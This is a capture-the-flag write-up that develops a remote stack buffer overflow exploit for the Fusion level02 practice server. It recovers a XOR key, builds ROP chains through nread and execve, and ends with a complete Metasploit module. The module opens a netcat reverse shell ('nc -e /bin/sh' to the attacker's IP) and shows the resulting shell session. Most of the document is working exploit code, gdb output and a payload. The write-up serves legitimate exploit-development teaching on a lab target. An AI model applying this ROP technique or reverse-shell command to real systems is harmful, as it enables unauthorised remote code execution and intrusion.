---
layout: post
title: Fusion level02 write up
excerpt: "Learn to develop a stack buffer overflow exploit from scratch. This is an intermediate difficulty walkthrough as ASLR and NX mitigations are enabled. The exploit is developed as a Metasploit module."
permalink: "fusion/level02"
categories: Exploit-dev
tags:
  - Exploit Development

---

Fusion [level02](https://exploit-exercises.com/fusion/level02) is considerably more challenging than the previous two levels. This post details my thought process and steps involved in writing the exploit and developing a Metasploit module.  

Table of Contents
=================
  * [Bug Analysis](#bug-analysis)
  * [Building The Client](#building-the-client)
  * [Retrieving The Key](#retrieving-the-key)
  * [Creating the Proof Of Concept](#creating-the-proof-of-concept)
  * [Making a Plan](#making-a-plan)
  * [First ROP chain - nread](#first-rop-chain---nread)
  * [Setting up the execve frame](#setting-up-the-execve-frame)
  * [Second ROP chain - execve](#second-rop-chain---execve)

## <a name="bug-analysis"></a> Bug Analysis
---

The server accepts messages of two types, an encrypt message and a quit message. The quit message is a single character 'Q'. The encrypt message is a type-length-value (TLV) format.

```
| 'E' | length | data |
```

The program stores the data from the encryption message into a fixed size buffer. The length specified in the message is how many bytes are copied.

{% highlight C %}
unsigned char buffer[32 * 4096]
... snip ...
nread(0 , &sz, sizeof(sz));
nread(0, buffer, sz);
{% endhighlight %}

A stack buffer overflow occurs if the message has a bigger size than the buffer. Specifially a length greater than 32*4096. The overflow will overwrite the return address of the `encrypt_file` function frame. Note that the data is encrypted before return address is used.

## <a name="building-the-client"></a> Building The Client
---

The server is listening for commands on port 20002:

{% highlight bash %}
root@fusion:~# lsof -i
COMMAND     PID     USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
...snip...
level02    1479    20002    3u  IPv4  12273      0t0  TCP *:20002 (LISTEN)
...snip...
{% endhighlight %}

Create an [empty Metasploit module]({{site.baseurl}}/files/EmptyTcpMetasploitModule.rb) and update the `register_options` array with the IP of your local fusion VM. I used the following path:

- `/opt/metasploit-framework/modules/exploits/fusion/level02.rb`

The Ruby `recv` method accepts a maximum length of bytes, but the client needs to read in all data before trying to send a message. below is a buffered recv that will keep reading data until the full message is consumed. I created a second convenience function to send the encrypt command.

{% highlight Ruby %}
def buffered_recv(size)
  data = ""
  new_data = ""
  size_to_receive = size
  while(data.length < size) do
    new_data = sock.recv(size_to_receive)
    size_to_receive -= new_data.length
    data += new_data
  end
  data
end

def encrypt(len, data)
  buffer = "E" + [len].pack('L') + data
  sock.put(buffer)
  msg = buffered_recv(124)
  enc_data = buffered_recv(len)
  return enc_data
end
{% endhighlight %}

Fill the `exploit` method to send an encrypt command then quit.

{% highlight Ruby %}
def exploit
  # Open the TCP connection
  connect

  # Receive initial messages
  buffered_recv(57)

  # Send some data to be encrypted
  data = "A" * 256
  encrypted_data = encrypt(data.length, data)
  print_status("Encrypted data: #{encrypted_data.inspect}")

  # Send the quit command
  sock.put('Q')
  disconnect
end
{% endhighlight %}

The module successfully encrypts some data.

{% highlight bash %}
msf exploit(level02) > exploit

[*] Started reverse handler on 192.168.1.37:4444
[*] Encrypted data: "\xEC\xF20\xDB\x88Ml\xA4\x055\xA3\xB3\x95\xAC\xA2z\xE5\xFF\xE0\xCE>-Ak\xC6\x1A\x8C M\x19O\xF7\xB9\xCB\x9E\xE6\a\xE2\xFE\xC6\x9D\x1D^-\xF4\xAD\xCA\xECQ\xEFT\x8C\xD2\x8E\xA1&\xE9i7\xC2\xC97\x84lW\x0F\x80\xA3^Z\x1FG\x12\"\xF7\xDE\x986\xF2'\xCF3a\xA719\xCB)\x9B\xE8\xA6\xB5\x10\xFD-\xBF\xFAy1\x9A\x0FkGK\x8B\xF0\xF5z\x0F\x19\xF8v\x8F\xE2\x86\xC0F\xC8\xF7\x06\xFFpUF\x90\x05\xBA}\xEC\xF20\xDB\x88Ml\xA4\x055\xA3\xB3\x95\xAC\xA2z\xE5\xFF\xE0\xCE>-Ak\xC6\x1A\x8C M\x19O\xF7\xB9\xCB\x9E\xE6\a\xE2\xFE\xC6\x9D\x1D^-\xF4\xAD\xCA\xECQ\xEFT\x8C\xD2\x8E\xA1&\xE9i7\xC2\xC97\x84lW\x0F\x80\xA3^Z\x1FG\x12\"\xF7\xDE\x986\xF2'\xCF3a\xA719\xCB)\x9B\xE8\xA6\xB5\x10\xFD-\xBF\xFAy1\x9A\x0FkGK\x8B\xF0\xF5z\x0F\x19\xF8v\x8F\xE2\x86\xC0F\xC8\xF7\x06\xFFpUF\x90\x05\xBA}"
{% endhighlight %}

## <a name="retrieving-the-key"></a> Retrieving The Key
---
The server uses a XOR cipher to encrypt the data. The key can be retrieved using the following three steps:

- Generate some data: A
- The program will xor the input with a key: A ^ K
- Xor the encrypted data with the input: A ^ A ^ K = K

Before retrieving the key we will need to know the key size. Attach gdb to the server and print the size of the key buffer:

{% highlight bash %}
root@fusion:/home/fusion# gdb -q
(gdb) b *cipher
Breakpoint 1 at 0x8049735: file level02/level02.c, line 6.
(gdb) c
Continuing.
[New process 28738]
[Switching to process 28738]

Breakpoint 1, cipher (blah=0xbfa142ac 'A' <repeats 200 times>..., len=256) at level02/level02.c:6
6 level02/level02.c: No such file or directory.
(gdb) p keybuf
$1 = {0 <repeats 32 times>}
(gdb)
{% endhighlight %}

The encryption key is 32 integers long or 128 bytes.

Like the previous levels this program will fork a new process for each connection, make sure to enable `follow-fork-mode child`. While creating the exploit we will be attaching gdb many times,`.gdbinit` can save a lot of typing. I recommend adding the following lines:

{% highlight bash %}
root@fusion:/home/fusion# cat .gdbinit
source gdb-checksec.py
source gdb-pattern.py

set disassembly-flavor intel
set follow-fork-mode child

attach 1479
c

root@fusion:/home/fusion#
{% endhighlight %}

To perform the xor operation I created another convenience function:

{% highlight Ruby %}
def xor_encrypt(data, key)
  # Make sure key is the same length as the data
  while key.length < data.length do
    key += key
  end
  key = key[0..data.length-1]  

  data.unpack('C*').zip(key.unpack('C*')).map { |p, e| p ^ e}.pack('C*')
end
{% endhighlight %}

To prove we can retrieve the key we will send two sets of data to be encrypted, use the first to find the key, and decrypt the second set.

{% highlight Ruby %}
def exploit
  # Open the TCP connection
  connect

  # Receive initial messages
  buffered_recv(57)

  # Send some data to be encrypted
  data = "A" *128
  encrypted_data = encrypt(data.length, data)

  key = xor_encrypt(data, encrypted_data)

  # Send some other data to be encrypted
  data2 = "B" * 128
  encrypted_data2 = encrypt(data2.length, data2)

  # The following should print 128 B characters
  plaintext = xor_encrypt(encrypted_data2, key)
  print_status(plaintext)

  # Send the quit command
  sock.put('Q')
  disconnect
end
{% endhighlight %}

Execute the module:

{% highlight bash %}
msf exploit(level02) > reload
[*] Reloading module...
msf exploit(level02) > exploit

[*] Started reverse handler on 192.168.1.37:4444
[*] BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
msf exploit(level02) >
{% endhighlight %}

Success, we have leaked the key.

## <a name="creating-the-proof-of-concept"></a> Creating the Proof Of Concept
---
How much data do we need to send to overwrite the return address in the encrypt_file frame?

This will be the distance between the start of the buffer and the return address of the `encrypt_file` frame. Using gdb we can subtract these two values:

{% highlight bash %}
root@fusion:/home/fusion# gdb -q
0xb7750424 in __kernel_vsyscall ()
(gdb) b *encrypt_file+3
Breakpoint 1 at 0x80497fa: file level02/level02.c, line 31.
(gdb) c
Continuing.
[New process 28911]
[Switching to process 28911]

Breakpoint 1, 0x080497fa in encrypt_file () at level02/level02.c:31
31  level02/level02.c: No such file or directory.
(gdb) i r $ebp
ebp            0xbfa342b8 0xbfa342b8
(gdb) x/1wx &buffer
0xbfa142ac: 0x00000000
(gdb) p/x (0xbfa342bc - 0xbfa142ac)
$1 = 0x20010
(gdb)
{% endhighlight %}

The return address is located 0x20010 bytes from the start of the buffer. Lets confirm by sending 0x20014 bytes of encrypted data.

{% highlight Ruby %}
def exploit
  # Open the TCP connection
  connect

  # Receive initial messages
  buffered_recv(57)

  # Recover the encryption key
  data = "A" *128
  encrypted_data = encrypt(data.length, data)
  key = xor_encrypt(data, encrypted_data)

  # Create enough data to cause a crash
  longdata = "A" * 0x20010
  longdata += [0xdeadbeef].pack('V')
  e = xor_encrypt(longdata, key)
  encrypt(e.length, e)

  # Send the quit command
  sock.put('Q')
  disconnect
end
{% endhighlight %}

Attach gdb, reload the exploit, and send it:

{% highlight bash %}
root@fusion:/home/fusion# gdb -q
0xb7750424 in __kernel_vsyscall ()
(gdb) c
Continuing.
[New process 29112]

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 29112]
0xdeadbeef in ?? ()
(gdb)
{% endhighlight %}

Confirmed we can control eip! Time to start the exploit!

## <a name="making-a-plan"></a> Making a Plan
---
We have control of eip and can put arbitrary data on the stack, but NX is enabled.

{% highlight bash %}
(gdb) checksec
| NX  | PIE | Canary | Relro   | Path      
| Yes | No  | No     | No      | /opt/fusion/bin/level02
| Yes | Yes | Yes    | Partial | /lib/i386-linux-gnu/libc.so.6
| Yes | Yes | No     | Partial | /lib/ld-linux.so.2

{% endhighlight %}

To get around this protection we will use return oriented programming (ROP). [ROPGadget](https://github.com/JonathanSalwan/ROPgadget) is a fantastic tool to find rop gadgets. This tool found 126 gadgets in the level02 binary.

We can use `execve` to execute netcat and open a connect back shell. The `execve` function takes an array of string pointers as an argument. Therefore We must have a number of strings at known memory locations. We can store data from the socket at an arbitrary location using `nread`. We will store this data in the [bss](http://en.wikipedia.org/wiki/.bss) section because it is not ASLR enabled, it is readble, and it is writable.

{% highlight bash %}
(gdb) maintenance info sections
Exec file:
    `/opt/fusion/bin/level02', file type elf32-i386.
    ...
    [25]     0x804b420->0x804b500 at 0x00002418: .bss ALLOC
    ...
{% endhighlight %}

Lets build a ROP chain to store arbitrary data as `0x0804b420`

_Note: Preferably we would execute a `mprotect` call to change the stack memory as executable, then execute an arbitrary payload. Unfortunately most of the gadgets are not very useful and I was not able to figure out a rop chain to execute `mprotect`._

## <a name="first-rop-chain---nread"></a> First ROP chain - nread
---

We control the value of eip, lets set eip to execute the nread function, which is located:

{% highlight bash %}
(gdb) p *nread
$1 = {ssize_t (int, void *, size_t)} 0x804952d <nread>
{% endhighlight %}

The `nread` function will expect the stack to have a return address and 3 function arguments: a file descriptor to read from, a buffer to write data, and a length argument. Since we control the values on the stack we can put arbitrary values at these locations.

The fake stack frame will:

- Return to `0xdeadbeef`
- Use the 0 file descriptor to read from the socket
- Write data to the bss segment at `0x0804b420
- Read the amount of data we plan to send

The fake stack frame is created like so:

{% highlight Ruby %}
def exploit
  # Open the TCP connection
  connect

  # Receive initial messages
  buffered_recv(57)

  # Recover the encryption key
  data = "A" *128
  encrypted_data = encrypt(data.length, data)
  key = xor_encrypt(data, encrypted_data)

  # Created enough data to cause a crash
  prejunk = "A" * 0x20010

  cmd = "A" * 32

  ropbuf = [0x0804952d].pack('V') # ret overwrite with addr of nread
  ropbuf += [0xdeadbeef].pack('I') # return of new frame
  ropbuf += [0x00000000].pack('I') # arg0: filedes
  ropbuf += [0x0804b420].pack('V') # arg1: buf ptr
  ropbuf += [cmd.length].pack('I') # arg2: length

  buf = prejunk + ropbuf
  e = xor_encrypt(buf, key)
  encrypt(e.length, e)

  # Send the quit command
  sock.put('Q')

  # Send extra data for the rop chain to read
  sock.put(cmd)

  disconnect
end
{% endhighlight %}

Attach gdb, reload the module, and send it:

{% highlight bash %}
root@fusion:/home/fusion# gdb -q
0xb7750424 in __kernel_vsyscall ()
(gdb) c
Continuing.
[New process 29413]

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 29413]
0xdeadbeef in ?? ()
(gdb) x/s 0x0804b420
0x804b420 <environ@@GLIBC_2.0>: 'A' <repeats 32 times>
(gdb)
{% endhighlight %}

Confirmed the rop chain executed, wrote the data, and returned to our controlled address.

At the time of the crash the next 12 bytes on the stack are from the rop chain just executed.  

{% highlight bash %}
0xdeadbeef in ?? ()
(gdb) x/4wx $esp
0xbfa342c4: 0x00000000  0x0804b420  0x00000020  0xb773fff4
(gdb)
{% endhighlight %}

To get a clean stack back return to a pop;pop;pop;ret gadget, one exists at `0x08048f85`

The rop chain becomes

{% highlight Ruby %}
ropbuf = [0x0804952d].pack('V') # addr of nread
ropbuf += [0x08048f85].pack('I') # return address, also pop;pop;pop;ret
ropbuf += [0x00000000].pack('I') # arg0: filedes
ropbuf += [0x0804b420].pack('V') # arg1: buf ptr
ropbuf += [data.length].pack('I') # arg2: length

# Place holder for next rop chain
ropbuf += [0xdeadbeef].pack('V')
{% endhighlight %}

Attach gdb, reload the exploit, run it again and we crash on `0xdeadbeef` again with a clean stack!

## <a name="setting-up-the-execve-frame"></a> Setting up the execve frame
---

We can read in arbitrary data to `0x0804b420`, but what data is required to fake the `execve` frame?

[execve](http://linux.die.net/man/2/execve) takes 3 arguemnts:

- The filename or path as a string pointer
- The set of arguments as a null terminated array of string pointers
- The set of environment variables as a null terminated array of strings pointers

The full command to execute is: `$ /bin/nc.traditional -e /bin/sh 192.168.1.37 4444`. This means reading in:

- A string for the path
- 5 string for arguments
- 5 pointers to these strings and a null terminator
- A null terminator for the environment variables

Incase the length of the IP and port strings change we will read in the pointer data first, then the strings.


{% highlight Ruby %}
def exploit
  # Open the TCP connection
  connect

  # Receive initial messages
  buffered_recv(57)

  # Recover the encryption key
  data = "A" *128
  encrypted_data = encrypt(data.length, data)
  key = xor_encrypt(data, encrypted_data)

  # Created enough data to cause a crash
  prejunk = "A" * 0x20010

  cmd = "/bin/nc.traditional"
  null = "\000"
  args = [cmd, "-e", "/bin/sh", datastore['LHOST'], datastore['LPORT'].to_s]
  bss = 0x0804b420
  data = ""


  # Create each of the string pointers
  offset = 24 + cmd.length + 1 # 6 ptrs, the command, and a null
  args.each do |arg|
    data += [bss+offset].pack('V')
    offset += arg.length + 1
  end
  # Terminate the string pointers
  data += [0x00000000].pack('V')

  # The first argument of execve, the filename
  data += cmd + null

  # Create each of the argument strings
  args.each { |arg| data += arg + null }

  ropbuf = [0x0804952d].pack('V') # addr of nread
  ropbuf += [0x08048f85].pack('I') # return address, also pop;pop;pop
  ropbuf += [0x00000000].pack('I') # arg0: filedes
  ropbuf += [0x0804b420].pack('V') # arg1: buf ptr
  ropbuf += [data.length].pack('I') # arg2: length

  # Placeholder for second ROP chain
  ropbuf += [0xdeadbeef].pack('I') # return of new frame address

  buf = prejunk + ropbuf
  e = xor_encrypt(buf, key)
  encrypt(e.length, e)

  # Send the quit command
  sock.put('Q')

  # Send extra data for the rop chain to read
  sock.put(data)

  disconnect
end
{% endhighlight %}

Attach gdb, reload the exploit, and send it. Inspect the data is read in as expected:
{% highlight bash %}
root@fusion:/home/fusion# gdb -q
0xb7750424 in __kernel_vsyscall ()
(gdb) c
Continuing.
[New process 32663]

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 32663]
0xdeadbeef in ?? ()
(gdb) x/6wx 0x0804b420
0x804b420 <environ@@GLIBC_2.0>: 0x0804b44c  0x0804b460  0x0804b463  0x0804b46b
0x804b430:  0x0804b478  0x00000000
(gdb) x/s 0x0804b44c
0x804b44c:  "/bin/nc.traditional"
(gdb) x/s 0x0804b460
0x804b460 <keyed.5339>: "-e"
(gdb) x/s 0x0804b463
0x804b463 <keyed.5339+3>: "/bin/sh"
(gdb) x/s 0x0804b46b
0x804b46b:  "192.168.1.37"
(gdb) x/s 0x0804b478
0x804b478:  "4444"
(gdb)
{% endhighlight %}

Excellent! All the arguments for the execve call are in place.

## <a name="second-rop-chain---execve"></a> Second ROP chain - execve
---

The final step will be executing the `execve` function. The address of `execve` is `0x0804b3d8`:

{% highlight bash %}
root@fusion:/home/fusion# objdump -R /opt/fusion/bin/level02 | grep execve
0804b3d8 R_386_JUMP_SLOT   execve
{% endhighlight %}

Luckily there is enough gadgets to pop this address into a register and call it as a pointer. The gadgets are:


{% highlight bash %}
pwf@ubuntu:~$ ROPgadget --binary level02
Gadgets information
============================================================
...
0x08048b13 : pop ebp ; ret
...
0x08049fe3 : call dword ptr [ebx]
...
Unique gadgets found: 126
pwf@ubuntu:~$
{% endhighlight %}

The second rop chain will be:

{% highlight bash %}
ropbuf += [0x08048818].pack('V') # pop ebx | ret
ropbuf += [0x0804b3d8].pack('V') # got entry for execve
ropbuf += [0x08049fe3].pack('V') # call ebx
ropbuf += [0x0804b438].pack('V') # addr of /bin/nc.traiditonal
ropbuf += [0x0804b420].pack('I') # addr of args
ropbuf += [0x00000000].pack('I') # null
{% endhighlight %}

Add the Metasploit handler method before disconnecting. Reload the module and execute it:

{% highlight bash %}
pwf@ubuntu:/opt/metasploit-framework$ ./msfconsole
[*] Starting the Metasploit Framework console...\
 _                                                    _
 / \    /\         __                         _   __  /_/ __
 | |\  / | _____   \ \           ___   _____ | | /  \ _   \ \
 | | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|
 |_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_
       |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\


=[ metasploit v4.11.0-dev [core:4.11.0.pre.dev api:1.0.0]]
+ -- --=[ 1454 exploits - 809 auxiliary - 230 post        ]
+ -- --=[ 363 payloads - 37 encoders - 8 nops             ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

msf > use exploit/fusion/level02
msf exploit(level02) > set RHOST 192.168.1.141
RHOST => 192.168.1.141
msf exploit(level02) > exploit

[*] Started reverse handler on 192.168.1.37:4444
[*] Command shell session 1 opened (192.168.1.37:4444 -> 192.168.1.141:54918) at 2015-05-08 07:48:53 -0700

id
uid=20002 gid=20002 groups=20002
{% endhighlight %}

Success! The puzzle is solved :). Below the full Metasploit module:

{% highlight Ruby %}
require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Fusion level02 remote stack buffer overflow',
      'Description'    => %q{
                           This module exploits a stack buffer overflow in level02 of the
                           fusion exploit exercises.
                           },
      'Author'         => [ 'Philip OKeefe' ],
      'Version'        => '1',
      'DefaultOptions' =>
              {
                      'EXITFUNC' => 'process',
              },
      'Payload'        =>
              {
                      'Space'    => 788,
                      'BadChars' => "\x00",
                      'StackAdjustment' => -4000,
              },
      'Platform'       => 'linux',

      'Targets'        =>
              [
                      ['Linux', {} ],
              ],
      'DefaultTarget' => 0,

      'Privileged'     => false
      ))

      register_options(
      [
              Opt::RHOST("192.168.0.17"),
              Opt::RPORT(20002),
      ], self.class)
   end


  def encrypt(len, data)
    buffer = "E" + [len].pack('L') + data
    sock.put(buffer)
    msg = buffered_recv(124)
    enc_data = buffered_recv(len)
    return enc_data
  end

  def buffered_recv(size)
    data = ""
    new_data = ""
    size_to_receive = size
    while(data.length < size) do
      new_data = sock.recv(size_to_receive)
      size_to_receive -= new_data.length
      data += new_data
    end
    data
  end

  def xor_encrypt(data, key)
    # Make sure key is the same length as the data
    while key.length < data.length do
      key += key
    end
    key = key[0..data.length-1]  

    data.unpack('C*').zip(key.unpack('C*')).map { |p, e| p ^ e}.pack('C*')
  end


  def exploit
    # Open the TCP connection
    connect

    # Receive initial messages
    buffered_recv(57)

    # Recover the encryption key
    data = "A" *128
    encrypted_data = encrypt(data.length, data)
    key = xor_encrypt(data, encrypted_data)

    # Created enough data to cause a crash
    prejunk = "A" * 0x20010

    cmd = "/bin/nc.traditional"
    null = "\000"
    args = [cmd, "-e", "/bin/sh", datastore['LHOST'], datastore['LPORT'].to_s]
    bss = 0x0804b420
    data = ""


    # Create each of the string pointers
    offset = 24 + cmd.length + 1 # 6 ptrs, the command, and a null
    args.each do |arg|
      data += [bss+offset].pack('V')
      offset += arg.length + 1
    end
    # Terminate the string pointers
    data += [0x00000000].pack('V')

    # The first argument, the filename
    data += cmd + null

    # Create each of the argument strings
    args.each { |arg| data += arg + null }

    # ROP chain for nread
    ropbuf = [0x0804952d].pack('V') # addr of nread
    ropbuf += [0x08048f85].pack('I') # return address, also pop;pop;pop
    ropbuf += [0x00000000].pack('I') # arg0: filedes
    ropbuf += [0x0804b420].pack('V') # arg1: buf ptr
    ropbuf += [data.length].pack('I') # arg2: length

    # ROP chain for execve
    ropbuf += [0x08048818].pack('V') # pop ebx | ret
    ropbuf += [0x0804b3d8].pack('V') # got entry for execve
    ropbuf += [0x08049fe3].pack('V') # call ebx
    ropbuf += [0x0804b438].pack('V') # addr of /bin/nc.traiditonal
    ropbuf += [0x0804b420].pack('I') # addr of args
    ropbuf += [0x00000000].pack('I') # null

    buf = prejunk + ropbuf
    e = xor_encrypt(buf, key)
    encrypt(e.length, e)

    # Send the quit command
    sock.put('Q')

    # Send extra data for the rop chain to read
    sock.put(data)

    handler
    disconnect
  end
end
{% endhighlight %}
